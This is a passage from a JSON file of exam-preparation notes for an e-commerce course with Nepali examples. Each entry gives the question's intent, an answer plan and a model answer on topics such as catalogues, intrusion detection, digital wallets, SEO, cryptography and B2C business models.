can name real e-commerce uses rather than only Bitcoin speculation.","how":"Define, give the three types on a closed-to-decentralised line, then four uses. Add one line on Nepal's regulatory position.","skel":["Virtual currency: digital value, no central bank","Closed: points and game credits","Convertible: platform credits and miles","Decentralised: Bitcoin on a blockchain","Uses: loyalty, micro-payments, cross-border"],"ans":"Virtual currency is a digital representation of value not issued by a central bank, used within a defined community. It differs from e-cash, which is a digital claim on fiat money.\n• Closed — cannot leave the platform: game credits, loyalty points.\n• Convertible — company-issued and exchangeable: airline miles, platform credits.\n• Decentralised — Bitcoin, issued by mining on a blockchain, with no central issuer.\nHow it works: the issuer creates units and assigns them to a wallet; the holder transfers to a merchant or user; the platform or ledger records it; value is set by demand, a peg, or market trading; conversion to fiat happens on an exchange.\nUses in e-commerce: loyalty points spendable at checkout; in-app purchases and micro-payments too small for card fees; promotional credits; cross-border payment and remittance; crypto checkout.\nNepal note: NRB does not recognise cryptocurrency as legal tender, so local platforms should use closed or convertible loyalty currency."},"ecom-31":{"u":4,"logic":"Tests the difference between a catalogue and a product page, and whether you know catalogues are built from structured data rather than hand-written HTML. The creation steps carry the marks.","how":"Define with the fields it holds, then number the creation steps from supplier data to publishing. Mention static versus dynamic in one line.","skel":["Catalog = structured product database","Fields: SKU, attributes, price, stock, media","Collect supplier data, define attributes","Photograph, write copy, price, import","Publish, then sync with stock and ERP"],"ans":"A catalogue is the structured database of everything a store sells: SKU, title, description, category, attributes and variants, price and tax class, stock, weight and dimensions, images, related items. It feeds category pages, search, cart, recommendations and marketplace feeds.\nHow it is created:\n1. Collect source data from suppliers and spreadsheets; note gaps.\n2. Define the taxonomy and attribute schema — category tree, required fields, units, variant axes such as size and colour.\n3. Write search-friendly titles and descriptions; standardise brand and model names.\n4. Photograph on a clean background; crop, compress and name files descriptively.\n5. Set price, discount, tax and shipping rules.\n6. Import by CSV or API into the CMS or PIM; check duplicates, missing attributes and broken images.\n7. Publish, then keep it synced with inventory and ERP.\nStatic catalogues are hand-coded HTML: cheap but hard to scale or personalise. Dynamic catalogues are generated from the database, so they support filters, search and personalisation."},"ecom-32":{"u":5,"logic":"Defines intrusion, then asks for the detection layer. It checks that you can distinguish detection from prevention and place NIDS and HIDS sensibly in an e-commerce architecture.","how":"Define intrusion in one line, then IDS by detection method and placement, and close with what it catches in a shop. Add one line on limits.","skel":["Intrusion: unauthorised access or misuse","IDS monitors traffic and host activity","Signature versus anomaly detection","NIDS at the perimeter, HIDS on servers","Alerts feed response; IPS blocks inline"],"ans":"An intrusion is unauthorised access to, or misuse of, a system that threatens confidentiality, integrity or availability — an exploited flaw, malware, privilege escalation, or an insider abusing access.\nAn IDS monitors network traffic and host activity, analyses it and raises alerts.\n• Signature-based — matches known patterns (SQL injection strings, exploit payloads, malware hashes): accurate for known threats, blind to new ones.\n• Anomaly-based — learns normal behaviour and flags deviation, such as a spike in failed logins or a large night export; catches new attacks but gives false positives.\n• Placement — a network IDS at the DMZ and core switch inspects packets; a host IDS agent on web, application and database servers watches files, processes and logs.\nAn IPS sits inline and blocks; an IDS only alerts, so shops run IDS plus a WAF.\nIt catches carding, credential stuffing on admin panels, SQL injection and XSS probes, web-shell uploads and odd database reads. IDS is detection only — pair it with firewalls, patching and least privilege."},"ecom-33":{"u":5,"logic":"Pairs the human attack with the control that limits damage. It tests whether you know authorization follows authentication, and whether you can name concrete models rather than saying 'use a password'.","how":"Two blocks: attack types with one Nepal example, then the four-step access control chain and three models. Name RBAC — it is the expected answer.","skel":["Social engineering manipulates people, not systems","Phishing, pretexting, baiting, tailgating","Access control: identify, authenticate, authorise","Models: ACL, RBAC, MAC, least privilege","Example: role limits on refunds and admin"],"ans":"Social engineering manipulates people into revealing information or performing actions that breach security — phishing and smishing, pretexting as eSewa support, baiting with a free gift, tailgating, a fake courier call asking for an OTP. It targets trust and urgency, so technical controls alone cannot stop it.\nAccess control ensures an authenticated user can do only what the role allows: identification, authentication, authorisation, accountability.\n• ACL — permitted operations per user or resource.\n• RBAC — permissions grouped into roles: customer, catalogue staff, order desk, finance, admin. A customer sees only their own orders; only finance above a limit approves refunds.\n• MAC — labels and clearances for sensitive data such as card tokens.\n• Least privilege, segregation of duties, MFA for admin actions, session timeouts, SSO and audit logs.\nWith training and callback verification, access control limits what a tricked employee can do."},"ecom-34":{"u":6,"logic":"Tests the three-stage social funnel on one platform. It checks whether you know actual Facebook tools — Pixel, lookalikes, Groups, Insights — rather than generic 'post often' advice.","how":"Three headings matching the question's words: acquire, amplify, strengthen. Name one tool and one metric under each.","skel":["Acquire: Page, like campaign, lookalikes","Pixel builds retargeting audiences","Amplify: Reels, live, contests, shares","Groups and Messenger keep fans engaged","Strengthen: identity, reviews, response time"],"ans":"Fan acquisition: complete the Page with a clear name, category and call to action; run Page-like and engagement campaigns; install the Meta Pixel for retargeting; build lookalike audiences from the customer list; use lead ads to collect numbers; put a QR code at the shop. Metric: cost per fan and per lead.\nAmplification: post Reels and go live for launches and festival sales; run shareable contests and polls; open a Facebook Group for buyers; use Messenger broadcasts; repost user photos and reviews; brief micro-influencers; cross-post to Instagram. Metric: shares, reach and engagement rate.\nBrand strengthening: keep one visual identity and tone; publish service and behind-the-scenes content, not only selling posts; collect and answer reviews; reply on Messenger quickly to keep the response badge; read Insights to see what converts; handle complaints publicly and fairly.\nIn Nepal, where Facebook is the default shopfront, paid reach finds fans, shareable content multiplies them, and service turns fans into repeat buyers."},"ecom-35":{"u":7,"logic":"A repeat of the recommendation topic from an earlier question, so the examiner expects a crisper comparison. It tests the significance argument plus a clean table of differences.","how":"This repeats ecom-12 — a sure shot. Answer with significance in three bullets, then a four-row comparison of collaborative versus content-based.","skel":["Significance: discovery, basket size, loyalty","Content-based uses item attributes","Collaborative uses other users' behaviour","Collaborative suffers cold start and sparsity","Hybrid is the production answer"],"ans":"Recommendation systems suggest products a shopper is likely to want. Significance: they turn a large catalogue into a personal shopfront so customers find products without searching; they raise basket size through cross-sell; they lift conversion and repeat visits; and the learned profile creates switching costs.\nCollaborative filtering uses many users' behaviour: it builds a user-item matrix; user-based finds similar shoppers and recommends what they bought, item-based finds products bought together (\"customers also bought\"). It needs no product attributes and surfaces surprising finds, but suffers cold start and sparsity.\nContent-based filtering uses item attributes and one user's history: it describes products by category, brand, price, colour and keywords, profiles what the user liked and recommends the most similar. It works from the first visit and for new products, and is easy to explain, but never surprises and depends on good metadata.\nIn one line: collaborative says \"people like you bought this\"; content-based says \"this is similar to what you bought\". Production systems use a hybrid."},"ecom-36":{"u":1,"logic":"Tests whether you know the Act actually gives digital certificates legal effect, not just that 'cyber law exists'. Examiners look for recognition, authentication, licensing of CAs and revocation — the four provisions students skip.","how":"Write the four provisions as headings first (recognition, authentication, CA licensing, revocation), then one line each. Six short bullets fill the page.","skel":["Definition: signature, hash, public key","Legal recognition of signed records","Authentication and burden of proof","Licensed CAs and government root CA","Revocation, suspension, evidentiary value"],"ans":"The Electronic Transactions Act, 2063 (2006) gives digital certificates and digital signatures legal force in Nepal.\n• Recognition — where any law requires a signature, a record signed with a valid digital signature is treated as signed.\n• Authentication — a record is authentic if signed by the subscriber's private key and unaltered since; the party denying it must prove otherwise.\n• Certifying authorities — CAs must be licensed, meet security and audit rules and publish their practices; a government root CA certifies them.\n• Certificate and duties — name, public key, serial, validity and CA signature; the subscriber protects the private key and reports compromise; the CA may suspend or revoke.\n• Evidence — a certificate is admissible in court and before the IT Tribunal."},"ecom-37":{"u":2,"logic":"Probes whether you can distinguish a business model (the logic of value creation) from a business plan or a revenue model. Most students list revenue models only and lose half the marks.","how":"One definition line, then the eight elements as numbered boxes around 'business model'. One Nepali example on value proposition and you are done.","skel":["Define model vs business plan","Value proposition and revenue model","Market opportunity, competitive environment","Competitive advantage and market strategy","Organisational development and management team"],"ans":"An e-commerce business model is the set of planned activities a firm uses to create, deliver and capture value and earn profit; the business plan documents it.\n1. Value proposition — why a customer buys from you; Daraz offers range plus home delivery with cash on delivery.\n2. Revenue model — sales, subscription, transaction fee, advertising, affiliate, freemium; Hamrobazar charges for featured ads.\n3. Market opportunity — size and growth of the addressable market, e.g. Nepal's young mobile-first online buyers.\n4. Competitive environment — rivals, substitutes and barriers; Daraz against SastoDeal and Facebook sellers.\n5. Competitive advantage — a defensible edge: cost, differentiation, first-mover, network effects, logistics.\n6. Market strategy — pricing, channels, partnerships and launch plan.\n7. Organisational development — team, structure, processes, courier and gateway partners.\n8. Management team — experience and credibility, which decides funding and execution.\nDraw eight boxes around a centre circle labelled business model."},"ecom-38":{"u":5,"logic":"Checks that you can separate the three defensive layers — client, server, data in transit — instead of dumping a threat list. The second half carries the marks; a threats-only answer caps at half.","how":"Split the page: top half threats in four bullets, bottom half three layers. Say 'client, server, data in transit' in the first line so the examiner sees the structure.","skel":["Threats: malware, phishing, hacking, fraud","Client-side controls","Server-side controls","Data transaction controls: TLS, tokenisation","Three-layer diagram"],"ans":"E-commerce runs on open networks, so threats hit the shopper's device, the merchant's server and the data in transit.\nThreats:\n• Malware — viruses, worms, trojans, ransomware, botnets; adware and spyware bundled with free downloads.\n• Social engineering and phishing — fake mails, smishing and vishing steal passwords, card data and OTPs.\n• Hacking — SQL injection, XSS, session hijacking, carding, DoS/DDoS.\n• Identity theft, spoofing, pharming, sniffing, insider abuse.\nProtection:\n• Client — patched browser and OS, antivirus, firewall, MFA, HTTPS only, no card entry on public Wi-Fi.\n• Server — hardened OS, firewall and WAF, least privilege, DMZ, IDS/IPS, logs, tested backups, PCI-DSS.\n• Data transaction — TLS 1.3, tokenisation instead of card storage, encryption at rest, salted password hashes, audit trails.\nDraw client — TLS tunnel — server — database."},"ecom-39":{"u":3,"logic":"Three payment instruments in one question, so examiners test coverage and sequencing, not depth. Credit card must show the authorisation-capture-settlement chain; stored value must show closed vs open loop.","how":"Three headed blocks in the order asked, each with participants and numbered steps. Name the SET messages and you own the second half of the marks.","skel":["Define e-payment in one line","Card: six parties, authorisation, capture","SET flow: registration, purchase, dual signature","E-checks: digital signature over instruction","Stored value: closed vs open loop, eSewa"],"ans":"E-payment is the electronic transfer of monetary value over a network by card, bank account or digital token.\nCredit card — six parties: cardholder, merchant, gateway, acquiring bank, card association, issuing bank.\n1. Cardholder enters card data on a TLS page; the merchant sends an authorisation request to the gateway.\n2. Gateway validates the merchant; under 3-D Secure or SET the issuer authenticates the cardholder by OTP.\n3. Acquirer routes the request through the card association to the issuer, which returns an approval code.\n4. Merchant captures; at settlement the acquirer credits the merchant and the issuer bills the cardholder.\nSET flow: cardholder registration, merchant registration, purchase request, dual signature, payment authorisation, payment capture.\nE-checks — the payer signs the instruction (payee, amount, date) with a digital signature and it clears through the banking network.\nStored value — value paid in advance and spent down: closed-loop (Daraz voucher) or open-loop (Visa prepaid); eSewa and Khalti are Nepal's version."},"ecom-40":{"u":1,"logic":"Tests whether you see u-commerce as a superset of m-commerce rather than a synonym. The mark is in the differentiating factors, not two separate definitions.","how":"One line defining both, then five difference bullets beginning Scope. Open with 'u-commerce is the superset' to fix the relationship before listing.","skel":["Define both, u-commerce superset","Scope: one device vs any device","Context awareness and sensors","Session continuity across devices","Example: Daraz app vs TV-to-wallet-to-store"],"ans":"U-commerce is commerce that follows the user across every device and context, while m-commerce is commerce over a mobile phone and mobile network only; u-commerce is the superset.\n• Scope — m-commerce is device-bound to the handset; u-commerce is anytime, anywhere, anyhow.\n• Context — u-commerce uses location, presence and sensor data; m-commerce is mostly app- or SMS-based.\n• Continuity — u-commerce carries a session across devices (cart on laptop, payment on watch); m-commerce is device-bound.\n• Identity — u-commerce assumes one persistent profile across all channels.\n• Example — the Daraz app is m-commerce; a TV ad, wallet payment and store pickup under one profile is u-commerce."},"ecom-41":{"u":2,"logic":"Checks the difference between an industry value chain (many firms, one industry) and a firm value chain (activities inside one firm) — a distinction that is regularly blurred. Also tests that you can name players, not just define.","how":"Draw the horizontal chain first and label six players; the definition then writes itself. Add the disintermediation line for the final mark.","skel":["Define chain: firm-to-firm value links","Suppliers, manufacturers, distributors","Retailers and customers","Support players: logistics, banks, IT","Disintermediation example"],"ans":"An industry value chain is the chain of value-adding activities performed by different firms in an industry, from raw material to final consumer; each link adds value and takes a margin.\nGeneric players:\n• Suppliers and producers — raw material, components, packaging.\n• Manufacturers — convert inputs into finished goods.\n• Distributors and wholesalers — bulk breaking, storage, transport, credit.\n• Retailers — sell to end customers (Daraz, a New Road shop).\n• Customers — consumers or business buyers.\n• Support players — logistics, banks and wallets, insurers, IT, advertising.\nDraw the chain with support players underneath.\nE-commerce compresses it: a Palpali dhaka producer sells on Instagram, bypassing distributor and retailer (disintermediation)."},"ecom-42":{"u":3,"logic":"The trap is writing only a definition. 'How it works' wants the money movement: load, authorise, debit, settle — with the wallet server and switch in the middle.","how":"Five numbered steps from registration to settlement, naming MPIN/OTP and the Fonepay switch. Then one line on closed, semi-closed and open wallets.","skel":["Define wallet: app storing funds or cards","Registration and KYC","Top-up from bank, card, agent","Pay by QR, MPIN and OTP","Settlement; wallet types"],"ans":"A digital wallet is an app or account that stores money or card credentials and pays electronically.\n1. Registration — mobile number, KYC documents and an MPIN.\n2. Loading — top-up from a bank account, card or agent cash-in into the wallet ledger.\n3. Paying — scan the merchant QR; the app signs the request with MPIN and OTP.\n4. Authorisation — the wallet server checks balance and limits, debits the user and credits the merchant through the Fonepay or connectIPS switch.\n5. Settlement — the merchant's balance moves to its bank; both sides get app and SMS receipts.\nTypes: closed, semi-closed, open (withdrawal allowed). Nepal: eSewa, Khalti, IME Pay."},"ecom-43":{"u":4,"logic":"Tests whether you understand that a catalogue is a database with a schema, not a list of products on a page. 'How can you create' wants a process, so a definition-only answer loses the method marks.","how":"Define with the words SKU, attributes and taxonomy, then five numbered creation steps ending in publish and maintain. Mention static vs dynamic in one closing line.","skel":["Define catalog as structured product database","Fields: SKU, attributes, price, stock, media","Collect data, define schema/taxonomy","Enrich, import via CSV or API","Publish, index, sync, archive"],"ans":"A catalog is the structured database of everything a store sells: each product with a SKU, title, description, attributes (size, colour, brand), price, stock, images, category and keywords. It drives search, filters, cart and checkout.\nHow catalogs are created:\n1. Collect product data from suppliers, ERP or a spreadsheet.\n2. Define a schema and taxonomy — categories, attributes, variants, units.\n3. Enrich — descriptions, images, metadata and keywords.\n4. Import into the catalog module or platform (WooCommerce, Magento) by CSV or API, validating duplicates.\n5. Publish and maintain — index for search, sync price and stock, archive dead items.\nSmall shops hand-code a static HTML catalog; growing stores generate a dynamic one from the database."},"ecom-44":{"u":5,"logic":"Examiners separate malware from potentially unwanted programs: adware and spyware are unwanted, monetised and often legal-looking. Full marks need the mechanism — how the program earns or steals.","how":"Define malicious code, list five families in one line, then split adware and spyware with how each earns or steals. End with a one-line defence list.","skel":["Define malicious code","Families: virus, worm, trojan, ransomware, botnet","Adware: bundling, pop-ups, redirects, PPC revenue","Spyware: keylogging, screenshots, exfiltration","Defences: official stores, permissions, anti-malware"],"ans":"Malicious code (malware) is any program written to damage, disrupt or gain unauthorised access to a system or its data: viruses, worms, trojans, ransomware and botnets.\nPotentially unwanted programs install without clear consent and serve the distributor:\n• Adware — bundled with free downloads; injects pop-ups and banners, changes the home page and redirects searches to affiliate links, earning pay-per-click revenue. It slows the browser and often carries spyware.\n• Spyware — runs silently, logs keystrokes, captures screenshots, form data, card numbers and browsing history, and sends them to a remote server; keyloggers and stalkerware are variants.\nDefence: official app stores only, permission review, anti-malware, patched OS, no card entry on ad-redirected pages."},"ecom-45":{"u":6,"logic":"Tests the vocabulary of ad billing and whether you know who carries the risk in each model. Students mix CPM with eCPM and forget CPV and flat fee entirely.","how":"One bullet per model with the unit and one use case. Put the risk line at the end: advertiser risk falls from CPM to CPA.","skel":["CPM: per thousand impressions, branding","CPC: per click, search ads","CPA/CPL: per sale or lead","CPV: per video view","Flat fee, hybrid, RTB auction"],"ans":"Pricing models decide what the advertiser pays and how the auction bills.\n• CPM — per 1,000 impressions, regardless of clicks; used for brand awareness on display and video. eCPM converts any model to a per-thousand figure for comparison.\n• CPC — per click; the basis of Google search and Meta link ads, priced by keyword competition and quality score.\n• CPA/CPL — per sale, sign-up or lead; lowest risk for the advertiser, dearest per unit.\n• CPV — per video view, usually counted at 30 seconds or completion.\n• Flat fee — a fixed amount for a placement or period; simple, with no performance link. Hybrid adds a CPA bonus.\nReal-time bidding auctions each impression in milliseconds by bid multiplied by quality score."},"ecom-46":{"u":6,"logic":"The question is cut off but clearly asks how three Meta tools serve social marketing. It probes whether you know the difference between an exchange (a buying mechanism) and engagement features (organic reach).","how":"Three headed blocks: exchange, reactions, sponsored messages. Define each tool before its marketing use, and draw the auction-to-retargeting arrow.","skel":["Facebook exchange: real-time ad auction","Targeting by profile, Pixel, lookalike","Reaction buttons: cheap engagement signal","Sentiment affects reach","Sponsored messages: paid inbox retargeting"],"ans":"Facebook's exchange is a real-time marketplace where advertiser demand from Ads Manager meets publisher supply across Facebook, Instagram and Audience Network; each impression is auctioned in milliseconds and targeted by profile, Pixel events and lookalike audiences.\nReaction buttons (Like, Love, Haha, Wow, Sad, Angry) are one-tap engagement signals: they lift reach because the algorithm treats reactions as quality, and the sentiment mix shows which creative works.\nSponsored messages are paid direct messages into Messenger or Instagram inboxes of people who already messaged the page — used for cart-abandonment reminders, order updates and offers, with an opt-out.\nDraw: advertiser → Meta auction → feed → reaction → retargeting."},"ecom-47":{"u":7,"logic":"Distinguishes SEO from SEM and on-page from off-page. The marks are in the concrete on-page elements — title, H1, URL, alt text, schema — not in praising SEO.","how":"Two lines of definition, then five on-page bullets in the order a page is built: keyword, headings, media, speed, schema. Add one Nepali example.","skel":["Define SEO and crawl-index-rank","Keyword placement: title, H1, URL, meta","Headings, internal links, alt text","Speed, mobile, HTTPS, schema markup","Canonical tags; Nepali example"],"ans":"SEO is improving a site's unpaid ranking for the queries buyers type, by aligning content and structure with how search engines crawl, index and rank.\nOn-page SEO is done inside the page:\n• One primary keyword in the title tag, H1, URL, meta description and first paragraph.\n• Logical heading hierarchy (H1 to H2 to H3), short paragraphs, internal links with descriptive anchors.\n• Descriptive image file names and alt text; compressed images.\n• Page speed and Core Web Vitals, mobile-first layout, HTTPS.\n• Schema.org Product markup for price, availability and reviews; canonical tags and clean URLs.\nExample: a Kathmandu khukuri store ranks for 'buy khukuri online' through title, H1, URL and alt text."},"ecom-48":{"u":7,"logic":"Tests whether you know what each method uses as its signal: item attributes for content-based, other users' behaviour for collaborative. Students describe both as 'recommending similar products' and lose the distinction.","how":"Two blocks with the same three sub-points: signal, method, example. Close with cold start and the hybrid fix in one line.","skel":["Both predict what a shopper will like","Content-based: item features vs profile","TF-IDF, embeddings, cosine similarity","Collaborative: user-item matrix, user or item based","Cold start, sparsity, hybrid"],"ans":"Both predict what a shopper will like, from different signals.\n• Content-based — matches item attributes to the user's own history. Products are described by features (category, brand, price band, keywords via TF-IDF or embeddings), a profile is built from liked items, and cosine similarity picks matches. Buying a 15-inch laptop recommends 15-inch sleeves. Needs no other users, but over-specialises.\n• Collaborative — uses other people's behaviour, not item features. A user-item matrix is built; user-based CF finds similar users, item-based CF finds items bought together ('customers also bought'). Daraz's 'frequently bought together' is an example.\nWeaknesses: cold start, sparsity, scalability; hybrid systems mix both."},"ecom-49":{"u":1,"logic":"A Turban-era question testing whether you can connect a media concept to commercial consequence, and then separate technological from market drivers. Most answers define convergence and stop.","how":"Three headed blocks in the question's order: definition, influence, drivers split technological and market. The split is where the marks sit.","skel":["Define convergence: media merge digitally","Influence: one channel from ad to payment","Rich content, social commerce, omnichannel","Technological drivers: digitisation, broadband, cloud","Market drivers: demand, competition, ad revenue"],"ans":"Media convergence is the merging of print, broadcast, telephony, computing and the internet into one digital stream delivered over a single network and read on one device.\nHow it influences e-commerce:\n• One channel carries catalogue, video, reviews and payment, so advertising and transaction share a page.\n• Rich content — video, 360-degree images, live streams — raises information density and conversion.\n• Social commerce (Instagram shops, TikTok live selling) shortens the path from ad to cart.\n• Content is produced once and republished across web, app and social, cutting cost per impression.\n• Cross-device behaviour creates omnichannel expectations; platforms and influencers become new intermediaries.\nTechnological drivers: digitisation, broadband and 4G/5G, cheap cloud storage, smartphones, codecs, APIs and AI.\nMarket drivers: demand for anytime content, competition and deregulation, ad revenue shifting online, platform network effects, falling production cost."},"ecom-50":{"u":3,"logic":"Three-part question where the last part carries the marks: designing a payment system, not using one. Students repeat the wallet definition and forget cost, interoperability, dispute handling and regulation.","how":"Wallet in two lines, four uses as bullets, then seven design issues as a headed list. Two words each: security, privacy, trust, cost, interoperability, scalability, regulation.","skel":["Wallet definition and types","Uses: checkout, P2P, bills, refunds","Security, privacy, trust, disputes","Cost, speed, settlement, interoperability","Scalability, usability, Nepali regulation"],"ans":"A digital wallet is an app or account that stores money or card credentials and pays electronically; closed, semi-closed or open, as with eSewa, Khalti and IME Pay.\nUse in e-commerce: QR or redirect checkout, one-tap repeat purchase, P2P transfers, bill payment, subscriptions, instant refunds.\nDesign issues for an electronic payment system:\n• Security — MPIN plus OTP, TLS, tokenisation, no stored card number, PCI-DSS.\n• Privacy — payer traceability, KYC and data rules under NRB directives and the Electronic Transactions Act.\n• Trust — chargebacks, refunds, escrow and verifiable receipts.\n• Cost and speed — transaction fee, settlement cycle, instant versus next-day credit.\n• Interoperability — QR standards, Fonepay and connectIPS switches, cards, cross-border.\n• Scalability — festive peak load, retries, offline fallback; usability — two taps, Nepali language, low-end phones.\n• Regulation — licensing, limits, anti-money-laundering reporting, VAT invoices."},"ecom-51":{"u":2,"logic":"Tests EDI as a standard-document exchange, not as e-mail. Full marks need the layered architecture and a concrete information-flow benefit in trade; most answers stop at 'faster and cheaper'.","how":"Definition, then the four-layer pipeline as a diagram, then the trade benefits. Draw the translator-VAN-translator chain; it is free marks.","skel":["Define EDI: standard documents, computer to computer","Standards: ANSI X12, EDIFACT","Use: PO, ASN, invoice, payment advice","Layered architecture: translator and VAN","Trade impact: speed, accuracy, visibility, audit"],"ans":"EDI is the computer-to-computer exchange of standard business documents — purchase order, invoice, advance ship notice, payment advice — between trading partners in a fixed machine-readable format (ANSI X12, EDIFACT), replacing paper and re-keying.\nUse in e-commerce: it automates the B2B order cycle — the buyer's system sends a PO, the supplier acknowledges and ships with an ASN, then invoices; stock, price and payment reconcile without human entry. Smaller firms use Web EDI or XML APIs.\nLayered architecture: business application → EDI translator (maps to the standard) → VAN or internet link (AS2, SFTP) → partner's translator → partner application.\nInfluence on trade information flow: documents move in minutes, so order-to-ship cycles shorten and just-in-time works across borders; re-keying errors fall; invoice, packing list and certificate of origin stay consistent with the shipment; both parties see the same status; audit trails satisfy customs and banks. Limits: setup cost, rigid standards, SME barrier."},"ecom-52":{"u":4,"logic":"A taxonomy question from the Turban text: it tests whether you can classify document types by medium and use, and whether you know a corporate library is a managed, indexed store rather than a folder.","how":"Define corporate library in one line, then six document types grouped as text, numbers, images, audio-video, web and records. One line on the DMS that manages them.","skel":["Corporate library: indexed, access-controlled store","Text: reports, contracts, policies","Spreadsheets, presentations, price lists","Scanned images, drawings, OCR PDFs","Audio, video, web pages, forms, records"],"ans":"A corporate library is a centrally indexed, access-controlled store of an organisation's documents in digital form, searchable by metadata so staff reuse information.\nTypes held:\n• Text documents — reports, policies, contracts, manuals (DOCX, PDF).\n• Spreadsheets and presentations — budgets, price lists, costing models, training decks.\n• Scanned images — invoices, signed agreements, engineering drawings, OCR'd PDFs.\n• Audio and video — meeting recordings, product demos, training, indexed by transcript.\n• Web and multimedia — HTML pages, e-forms, catalogues, brochures.\n• Structured records — databases, e-mails, specifications, CAD files.\nA document management system stores their metadata, versions and access rights."},"ecom-53":{"u":1,"logic":"Tests a piece of infrastructure vocabulary students skip, then asks for market forces rather than technology. Answers that list only fibre and 5G miss the market half.","how":"Define I-way as the information superhighway with its three layers, then five market-force bullets. Nepali telecom competition is your example.","skel":["I-way: high-capacity digital infrastructure","Layers: network, transport, applications","Demand for bandwidth and content","Competition, privatisation, pricing","Regulation, spectrum, investment, policy"],"ans":"The I-way (information superhighway) is the global high-capacity digital infrastructure — telecom backbone, fibre, satellite, cable, mobile networks, ISPs and the web — that carries e-commerce traffic. Its layers are network, transport and services, and applications.\nMarket forces:\n• Bandwidth demand — video, mobile apps and cloud pull capacity into networks.\n• Competition and privatisation — NTC against Ncell and private ISPs pushes prices down and coverage out.\n• Regulation — NTA sets spectrum, interconnection and rural rollout obligations.\n• Technology push — fibre-to-the-home, 4G/5G, satellite broadband, cheaper devices.\n• Capital and policy — investment cycles, the Digital Nepal Framework, universal service funds.\n• Content — local-language content, e-government and social media give people a reason to be online."},"ecom-54":{"u":2,"logic":"Tests the mercantile process model and whether you can stay inside the customer's viewpoint after the order. Most students drift into seller logistics; the question says customer perspective twice.","how":"Name the three phases in one line, then six post-purchase customer touchpoints from confirmation to repurchase. Keep every verb in the customer's voice.","skel":["Mercantile process: pre-purchase, purchase, post-purchase","Order confirmation and tracking","Delivery, COD payment, condition check","Installation, warranty, returns, refunds","Complaints, reviews, repurchase, loyalty"],"ans":"The mercantile process has pre-purchase (search, compare), purchase (order, pay) and post-purchase phases. From the customer's side, post-purchase means everything after the order:\n• Confirmation and tracking — acknowledgement, dispatch notice, tracking number; silence is the biggest complaint driver.\n• Delivery — on time, correct, undamaged; paying cash on delivery and checking the item before accepting.\n• Installation or activation — setup help and first-use guidance.\n• Service and returns — warranty, replacement, refund, judged on how easy the returns window and pickup are.\n• Complaints and reviews — resolution speed, and the review that shapes the next buyer's decision.\n• Repurchase and loyalty — reminders, replenishment, loyalty points, personalised offers.\nWeak post-purchase service kills repeat purchase, so firms invest in reverse logistics."},"ecom-55":{"u":1,"logic":"Tests the three ideas named in the question and how they fit together: publishing is hypertext, reading is a universal browser, delivery is client-server. Students describe the web's history instead.","how":"Three headed blocks matching the three phrases, then a one-line synthesis and the e-commerce mapping. Draw browser-server with URL and HTTP labels.","skel":["Hypertext, HTML, URL, HTTP links","Universal reader: any browser, any device","Client-server request and response","Stateless HTTP plus cookies and sessions","Store = this plus catalogue and gateway"],"ans":"The web is a client-server system for publishing and reading hypertext; the three concepts are its three halves.\nGlobal hypertext publishing — any server can publish; pages are written in HTML and joined by URLs and hyperlinks, so the world's documents form one addressable web. HTTP is the request-response protocol.\nUniversal reader — the browser renders any page: it parses HTML, CSS and JavaScript, follows links and runs on any device. This universality, with free browsers, made the web a mass medium.\nClient-server — the browser sends an HTTP GET, the server returns the resource with a status code and headers, calling application and database tiers behind it; cookies carry state over stateless HTTP.\nAn e-commerce store is this architecture plus a catalogue database, session cart and payment gateway. Draw browser → server → database."},"ecom-56":{"u":5,"logic":"Tests whether you can map each cryptographic tool to the security property it buys. Listing AES and RSA without saying which threat each answers is the common half-mark answer.","how":"Define crypto, then one bullet per mechanism matched to confidentiality, integrity, authenticity, non-repudiation. End with the TLS hybrid example.","skel":["Define cryptography: plaintext to ciphertext","Symmetric AES: fast, key distribution problem","Asymmetric RSA/ECC: key exchange, signatures","Hash SHA-256: integrity","Digital signature and certificates: authenticity"],"ans":"Cryptography transforms readable plaintext into ciphertext with a key, so only the key-holder can reverse it; it gives confidentiality, integrity, authentication and non-repudiation.\n• Symmetric (AES) — one shared key, fast, for bulk data; the problem is distributing the key.\n• Asymmetric (RSA, ECC) — a public key encrypts or verifies, a private key decrypts or signs; solves key distribution but is slow.\n• Hybrid — TLS uses an asymmetric handshake to agree a session key, then AES encrypts the session; HTTPS protects the card form and OTP.\n• Hash (SHA-256) — a one-way digest; any change alters it, so it checks integrity.\n• Digital signature — hash the message, sign with the sender's private key; the receiver verifies with the public key, proving authenticity and non-repudiation.\n• Certificates and PKI bind a public key to a merchant's identity, so the browser knows the site is genuine."},"ecom-57":{"u":1,"logic":"Tests three of Laudon's eight features with an example, so precision matters more than breadth. Students define ubiquity as 'mobile' and richness as 'good content' and lose the economic point.","how":"One bullet each with the economic consequence, then a single Daraz product page as the worked example covering all three. Do not list the other five features.","skel":["Ubiquity: market anywhere, anytime","Richness: depth of video, reviews, chat","Information density: volume, quality, timeliness","Consequence: buyer power, price transparency","One Daraz product page as example"],"ans":"Ubiquity — e-commerce is available everywhere and at all times on any device, so the market is no longer a physical place; transaction cost falls and a buyer can purchase at 2 a.m. from a bus.\nRichness — the depth of information a site delivers: text, video, audio, 3D, reviews, live chat, personalisation. It approaches face-to-face selling at a fraction of the cost.\nInformation density — the amount, quality and timeliness of information available to all participants; prices, stock and reviews become transparent, shifting power to the buyer.\nExample: a Daraz page at midnight shows price, stock, seller rating, three hundred reviews, video, delivery date and returns policy — ubiquity, richness and density in one page."},"ecom-58":{"u":2,"logic":"Tests the seven-model B2C taxonomy from Laudon with examples, and whether you can match a real Nepali business to a model. A generic list of 'online shopping sites' collapses the marks.","how":"Seven bullets, each with model, description, example and revenue line. One closing sentence shows you can combine models.","skel":["E-tailer: Daraz, Amazon","Community provider and content provider","Portal: search plus services","Transaction broker and market creator","Service provider; revenue model each"],"ans":"B2C e-commerce sells to individual consumers. Laudon's models:\n• E-tailer — online retail of physical or digital goods; pure-click (Daraz, Amazon) or bricks-and-clicks (Bhatbhateni online). Revenue: product sales.\n• Community provider — a platform where users interact; Facebook, LinkedIn. Revenue: advertising, premium membership.\n• Content provider — sells information and entertainment; Netflix, Spotify, paywalled news. Revenue: subscription, advertising.\n• Portal — a gateway bundling search, news, mail and shopping; Google, Onlinekhabar. Revenue: advertising, referral fees.\n• Transaction broker — processes a sale for a fee without owning stock; Booking.com, eSewa bill payments. Revenue: commission.\n• Market creator — a marketplace where buyers and sellers set prices; eBay, Hamrobazar. Revenue: listing and commission fees.\n• Service provider — sells services online; SaaS, cloud hosting, online tutoring. Revenue: subscription or pay-per-use.\nModels combine: Daraz is e-tailer plus market creator."},"ecom-59":{"u":5,"logic":"Two parts: why security is indispensable, then the six dimensions read from two 